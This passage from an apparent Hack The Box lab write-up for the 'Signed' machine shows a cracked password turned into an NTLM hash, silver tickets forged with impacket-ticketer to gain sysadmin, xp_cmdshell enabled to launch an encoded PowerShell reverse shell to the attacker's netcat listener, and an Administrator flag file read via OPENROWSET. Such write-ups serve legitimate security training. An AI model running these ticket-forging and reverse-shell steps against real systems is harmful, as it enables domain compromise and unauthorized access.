But since we are going to use `impacket-ticketer` which expects the hash in uppercase we can feed the output to `tr`  in order to convert it to uppercase.

```bash
echo -n 'purPLE9795!@' | iconv -t UTF-16LE | openssl dgst -md4 | tr '[:lower:]' '[:upper:]'
```

```bash
┌──(darklight㉿jinx)-[~/…/ctf/htb/machines/signed]
└─$ echo -n 'purPLE9795!@' | iconv -t UTF-16LE | openssl dgst -md4 | tr '[:lower:]' '[:upper:]'
MD4(STDIN)= EF699384C3285C54128A3EE1DDB1A0CC

┌──(darklight㉿jinx)-[~/…/ctf/htb/machines/signed]
└─$ python3 calc-ntlm.py                                                                       
NTLM Hash: EF699384C3285C54128A3EE1DDB1A0CC
```

Now we need the RID for `SIGNED\IT` group which we can extract from the groups SID.

```sql
SQL (SIGNED\mssqlsvc  guest@master)> SELECT name, sid FROM sys.server_principals WHERE name='SIGNED\IT'
name                                                                sid   
---------   -----------------------------------------------------------   
SIGNED\IT   b'0105000000000005150000005b7bb0f398aa2245ad4a1ca451040000' 
```

Then we can use the `hex-sid.py` to get the SID and then we extract the RID.

```bash
 python3 hex-sid.py  
S-1-5-21-4088429403-1159899800-2753317549-1105
```

RID is `1105`

We then forge the ticket:

```bash
impacket-ticketer -nthash EF699384C3285C54128A3EE1DDB1A0CC -dc-ip 10.129.16.168 -domain SIGNED.HTB -domain-sid S-1-5-21-4088429403-1159899800-2753317549 -spn 'MSSQLSvc/DC01.SIGNED.HTB:1433' -user-id '1103' -groups 1105  mssqlsvc
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for SIGNED.HTB/mssqlsvc
[*] 	PAC_LOGON_INFO
[*] 	PAC_CLIENT_INFO_TYPE
[*] 	EncTicketPart
[*] 	EncTGSRepPart
[*] Signing/Encrypting final ticket
[*] 	PAC_SERVER_CHECKSUM
[*] 	PAC_PRIVSVR_CHECKSUM
[*] 	EncTicketPart
[*] 	EncTGSRepPart
[*] Saving ticket in mssqlsvc.ccache
```

Now if we authenticate using the ticket we will be a member of `SIGNED\IT` therefore having `sysadmin` privileges.

Before authenticating update `/etc/krb5.conf` to:

```bash
[libdefaults]
    dns_lookup_kdc = false
    dns_lookup_realm = false
    default_realm = SIGNED.HTB
    ticket_lifetime = 24h
    forwardable = true

[realms]
    SIGNED.HTB = {
        kdc = DC01.SIGNED.HTB
        admin_server = DC01.SIGNED.HTB
        default_domain = SIGNED.HTB
    }

[domain_realm]
    .signed.htb = SIGNED.HTB
    signed.htb = SIGNED.HTB
```


export the ticket :

```bash
export KRB5CCNAME=mssqlsvc.ccache
```

The authenticate:

```bash
impacket-mssqlclient -k DC01.SIGNED.HTB
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232) 
[!] Press help for extra shell commands
SQL (SIGNED\mssqlsvc  dbo@master)> 
```

Notice now we are not mapped to `guest` but `dbo` 

Enable `xp_cmdshell` then proceed to get a reverse shell.

```sql
SQL (SIGNED\mssqlsvc  dbo@master)> enable_xp_cmdshell
INFO(DC01): Line 196: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
INFO(DC01): Line 196: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (SIGNED\mssqlsvc  dbo@master)> xp_cmdshell "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2

[SNIP]
```


```bash
rlwrap nc -lvnp 1337             
listening on [any] 1337 ...
connect to [10.10.16.26] from (UNKNOWN) [10.129.16.168] 56381

PS C:\Windows\system32> whoami
signed\mssqlsvc
PS C:\Windows\system32> 
```


## Privilege Escalation

We will use the same concept, forge a ticket with higher privileges and then execute the reverse shell. This can be achiever by adding the RIDs of `Domain Admins` and `Enterprise Admins` when forging the Ticket.

```powershell
PS C:\users\mssqlsvc\Desktop> Get-ADGroup "Domain Admins" | Select-Object Name, SID

Name          SID                                          
----          ---                                          
Domain Admins S-1-5-21-4088429403-1159899800-2753317549-512

PS C:\users\mssqlsvc\Desktop> Get-ADGroup "Enterprise Admins" | Select-Object Name, SID

Name              SID                                          
----              ---                                          
Enterprise Admins S-1-5-21-4088429403-1159899800-2753317549-519

```

Forge ticket

```bash
impacket-ticketer -nthash EF699384C3285C54128A3EE1DDB1A0CC -dc-ip 10.129.49.118 -domain SIGNED.HTB -domain-sid S-1-5-21-4088429403-1159899800-2753317549 -spn 'MSSQLSvc/DC01.SIGNED.HTB:1433' -user-id '1103' -groups 1105,512,519  mssqlsvc
```

We then authenticate and get a reverse shell. That does not work. We still dont have access to the administrator directory.


#### Reading files from SQL service using OPENROWSET

```sql
SQL (SIGNED\mssqlsvc  dbo@master)> EXEC sp_configure 'Ad Hoc Distributed Queries', 1;
INFO(DC01): Line 196: Configuration option 'Ad Hoc Distributed Queries' changed from 0 to 1. Run the RECONFIGURE statement to install.
```

This command enables the `Ad Hoc Distributed Queries` feature in SQL Server, which allows the use of `OPENROWSET` and `OPENDATASOURCE` functions to query external data sources, including local files via the `BULK` provider.

By default, `Ad Hoc Distributed Queries` is disabled (set to 0) for security reasons, as it can be used to access external systems or files. Enabling it (setting to 1) is a prerequisite for the `OPENROWSET` command to read `root.txt`.

```sql
SQL (SIGNED\mssqlsvc  dbo@master)> RECONFIGURE;
```

Applies the configuration change made by `sp_configure`, making `Ad Hoc Distributed Queries` active in the current SQL Server instance.

```sql
SQL (SIGNED\mssqlsvc  dbo@master)> SELECT * FROM OPENROWSET(BULK 'C:\Users\Administrator\Desktop\root.txt', SINGLE_CLOB) AS x;
BulkColumn                                
---------------------------------------   
b'be065dce1364f02b20456f876739ca45\r\n'
```

Reads the contents of` C:\Users\Administrator\Desktop\root.txt` as a` single character large object (CLOB)` using the `OPENROWSET` function with the `BULK` provider.

Took approximately `8 hours and 31 minutes` to complete this machine.